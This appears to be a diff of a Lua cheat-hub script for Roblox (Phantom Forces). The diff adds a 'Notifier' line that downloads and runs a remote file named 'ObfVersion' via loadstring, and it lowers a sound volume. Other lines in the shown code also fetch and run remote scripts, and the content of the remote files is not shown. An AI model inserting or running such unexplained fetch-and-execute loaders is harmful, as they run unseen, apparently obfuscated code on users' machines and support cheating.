@@ -1,3 +1,7 @@
+--[[ Notifier ]]--
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iRasz/lost/main/ObfVersion"))()
+
 --[[ Notification]]--
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Notifier/main/Ping.lua"))()
@@ -104,7 +108,7 @@ PhantomForcesWindow = Library:NewWindow("Rass Script " .. ThisActuallyCool())
 WeLoveCat = PhantomForcesWindow:NewSection("Script")
 --[[ Hub Script ]] --
 WeLoveCat:CreateButton("Wyvern", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iRasz/Script/main/Wyvern"))()
-  Sound(6150774030, 0.9)
+  Sound(6150774030, 0.1)
 Notify("Wyvern Loading.....",3)
   
 end)
